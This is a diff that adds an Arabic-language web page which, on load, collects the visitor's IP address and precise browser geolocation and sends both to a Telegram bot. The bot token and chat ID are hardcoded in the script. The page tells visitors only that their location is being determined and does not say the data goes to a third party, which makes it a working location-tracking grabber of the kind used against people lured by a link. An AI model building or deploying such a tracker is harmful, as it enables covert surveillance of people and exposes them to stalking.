@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+  <meta charset="UTF-8">
+  <title>تحديد الموقع و IP</title>
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding-top: 100px; }
+    #status { font-size: 18px; margin-top: 20px; white-space: pre-line; }
+  </style>
+</head>
+<body>
+  <h2>جارٍ تحديد موقعك و عنوان IP...</h2>
+  <div id="status">انتظر قليلاً...</div>
+
+  <script>
+    const botToken = "7479937324:AAF2xQMakcnYT2z_hjuhbL_M8muZOg-dI0s";
+    const chatId = "7188733937";
+
+    let ipAddress = "";
+    let locationData = null;
+
+    // تحديث الرسالة الظاهرة
+    function updateStatus(msg) {
+      document.getElementById("status").innerText = msg;
+    }
+
+    // إرسال إلى تليجرام
+    function sendToTelegram() {
+      if (!ipAddress || !locationData) {
+        updateStatus("❌ البيانات غير مكتملة، لم يتم الإرسال.");
+        return;
+      }
+
+      const lat = locationData.coords.latitude.toFixed(6);
+      const lon = locationData.coords.longitude.toFixed(6);
+
+      const message =
+        `📍 تم تحديد موقع جديد:\n\n` +
+        `🌐 خط العرض: ${lat}\n` +
+        `🧭 خط الطول: ${lon}\n` +
+        `💻 عنوان IP: ${ipAddress}`;
+
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+      fetch(url)
+        .then(res => res.json())
+        .then(data => {
+          if (data.ok) {
+            updateStatus(`✅ تم إرسال البيانات بنجاح:\n\n${message}`);
+          } else {
+            updateStatus("❌ فشل في الإرسال إلى تليجرام.");
+            console.error("Telegram Error:", data);
+          }
+        })
+        .catch(err => {
+          updateStatus("❌ خطأ في الاتصال بتليجرام.");
+          console.error("Fetch Error:", err);
+        });
+    }
+
+    // طلب IP أولاً
+    fetch("https://api.ipify.org?format=json")
+      .then(res => res.json())
+      .then(data => {
+        ipAddress = data.ip;
+        console.log("IP Address:", ipAddress);
+        requestLocation();  // بعد جلب IP نطلب الموقع
+      })
+      .catch(err => {
+        ipAddress = "غير معروف";
+        console.error("IP Fetch Error:", err);
+        requestLocation();
+      });
+
+    // طلب الموقع
+    function requestLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(
+          position => {
+            locationData = position;
+            sendToTelegram();
+          },
+          error => {
+            updateStatus("❌ خطأ في تحديد الموقع.");
+            console.error("Location Error:", error);
+          }
+        );
+      } else {
+        updateStatus("❌ المتصفح لا يدعم تحديد الموقع.");
+      }
+    }
+  </script>
+</body>
+</html>
